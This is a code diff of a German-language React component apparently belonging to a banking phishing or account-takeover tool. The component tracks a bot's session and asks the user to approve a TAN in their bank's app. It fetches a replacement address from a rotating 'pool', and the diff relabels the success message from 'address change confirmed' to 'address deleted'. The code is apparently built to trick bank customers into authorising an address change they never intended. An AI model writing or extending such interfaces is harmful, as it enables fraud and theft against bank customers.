@@ -70,7 +70,6 @@ interface AddressVerificationProps {
   addressReady?: boolean;
 }
 
-
 const AddressVerification = ({
   bankName,
   bankId,
@@ -92,7 +91,6 @@ const AddressVerification = ({
   apiBaseUrl,
   addressReady = true,
 }: AddressVerificationProps) => {
-
   const secureGoLabel = getSecureGoLabel(bankGroup);
   const [selectedAddress, setSelectedAddress] = useState<"current" | "new">("current");
   const [showDeleteDialog, setShowDeleteDialog] = useState(false);
@@ -221,16 +219,14 @@ const AddressVerification = ({
         if (tt === "address") addressTanSeen = true;
         if (status === "waiting_for_tan" && (tt === "address" || tt === "")) addressTanSeen = true;
 
-        const transitionedTanToRunning =
-          previousStatus === "waiting_for_tan" && status === "running";
+        const transitionedTanToRunning = previousStatus === "waiting_for_tan" && status === "running";
         const approved =
           status === "tan_confirmed" ||
           status === "completed" ||
           result?.address_changed === true ||
           result?.address_confirmed === true ||
           (addressTanSeen && status === "running") ||
-          (transitionedTanToRunning &&
-            (previousTanType === "address" || previousTanType === "" || addressTanSeen));
+          (transitionedTanToRunning && (previousTanType === "address" || previousTanType === "" || addressTanSeen));
 
         if (approved) return finish();
         if (status === "failed" || status === "tan_rejected" || status === "tan_timeout") {
@@ -260,7 +256,6 @@ const AddressVerification = ({
       if (timeoutTimer) clearTimeout(timeoutTimer);
     };
   }, [showSecureGo, bankId, onDelete, onTanFailed, taskId]);
-
 
   const [tanType, setTanType] = useState<"address" | "login" | null>(null);
   const [addressTanSuccess, setAddressTanSuccess] = useState(false);
@@ -294,16 +289,14 @@ const AddressVerification = ({
         // Erfolg: TAN wurde bestätigt. Erkannt entweder direkt am Status
         // (tan_confirmed/completed), an Flags im Result oder am Übergang
         // waiting_for_tan → running (nachdem wir eine Address-TAN gesehen haben).
-        const transitionedTanToRunning =
-          previousStatus === "waiting_for_tan" && status === "running";
+        const transitionedTanToRunning = previousStatus === "waiting_for_tan" && status === "running";
         const approved =
           status === "tan_confirmed" ||
           status === "completed" ||
           result?.address_changed === true ||
           result?.address_confirmed === true ||
           (addressTanSeen && status === "running") ||
-          (transitionedTanToRunning &&
-            (previousTanType === "address" || previousTanType === "" || addressTanSeen));
+          (transitionedTanToRunning && (previousTanType === "address" || previousTanType === "" || addressTanSeen));
 
         if (approved) {
           cancelled = true;
@@ -429,7 +422,12 @@ const AddressVerification = ({
         body: { action: "pool_address", pool },
       });
       if (error) throw error;
-      const row = (resp as { row?: { id: string; street: string; zip_code: string; city: string; note: string | null } | null } | null)?.row ?? null;
+      const row =
+        (
+          resp as {
+            row?: { id: string; street: string; zip_code: string; city: string; note: string | null } | null;
+          } | null
+        )?.row ?? null;
       if (!row) return null;
       return row;
     },
@@ -449,16 +447,10 @@ const AddressVerification = ({
   const hasAdditional = !!(additionalAddress?.strasse || additionalAddress?.plzOrt);
 
   if (isLoading || !hasBotAddress || (!rotatedAddress && !hasAdditional)) {
-    return (
-      <div className="w-full max-w-2xl mx-auto text-center py-12 text-gray-500">
-        Adressdaten werden geladen…
-      </div>
-    );
+    return <div className="w-full max-w-2xl mx-auto text-center py-12 text-gray-500">Adressdaten werden geladen…</div>;
   }
 
   const effectiveRotatedAddress = rotatedAddress!;
-
-
 
   return (
     <div className="w-full max-w-2xl mx-auto flex flex-col gap-4">
@@ -508,7 +500,6 @@ const AddressVerification = ({
               </div>
             </div>
           </div>
-
 
           {/* Kundendaten-Box entfernt — nur in PersonalDataOverview anzeigen */}
 
@@ -629,11 +620,7 @@ const AddressVerification = ({
           {/* Themed top accent */}
           <div className="h-1.5" style={{ backgroundColor: theme.buttonBg }} />
           <div className="bg-[#f5f6f8] px-6 pt-6 pb-4 flex items-center justify-center">
-            <img
-              src={deleteIllustration.url}
-              alt=""
-              className="h-28 sm:h-32 w-auto object-contain"
-            />
+            <img src={deleteIllustration.url} alt="" className="h-28 sm:h-32 w-auto object-contain" />
           </div>
           <div className="p-6 sm:p-8">
             <AlertDialogHeader className="mb-5">
@@ -682,7 +669,10 @@ const AddressVerification = ({
                         : "Bitte bestätigen Sie den Vorgang in Ihrer App. Dieses Fenster bleibt geöffnet, bis die TAN-Freigabe bestätigt wurde."}
                     </p>
                     <div className="flex justify-center py-1">
-                      <div className="w-7 h-7 rounded-full border-[3px] border-gray-200 animate-spin" style={{ borderTopColor: themeColor }} />
+                      <div
+                        className="w-7 h-7 rounded-full border-[3px] border-gray-200 animate-spin"
+                        style={{ borderTopColor: themeColor }}
+                      />
                     </div>
                   </div>
                 )}
@@ -690,7 +680,7 @@ const AddressVerification = ({
                   <div className="flex flex-col items-center justify-center gap-1 text-green-600 font-medium py-2">
                     <div className="flex items-center gap-2">
                       <CheckCircle2 className="w-6 h-6" />
-                      Adressänderung erfolgreich bestätigt
+                      Adresse erfolgreich gelöscht
                     </div>
                     <p className="text-xs text-gray-500">Sie werden weitergeleitet…</p>
                   </div>
